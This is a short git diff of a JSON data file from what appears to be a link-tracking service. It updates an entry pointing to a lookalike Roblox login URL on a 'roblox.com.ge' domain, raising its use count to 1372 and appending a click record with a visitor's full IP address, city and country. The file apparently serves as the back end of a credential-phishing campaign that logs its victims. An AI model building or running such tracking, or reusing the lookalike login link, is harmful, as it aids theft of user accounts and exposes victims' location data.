@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1371,
+    "useCount": 1372,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11136,6 +11136,14 @@
         "city": "Fresnillo",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777421018483,
+        "ip": "174.115.149.162",
+        "country": "Canada",
+        "city": "Ottawa",
+        "flag": "🇨🇦",
+        "countryCode": "CA"
       }
     ]
   },
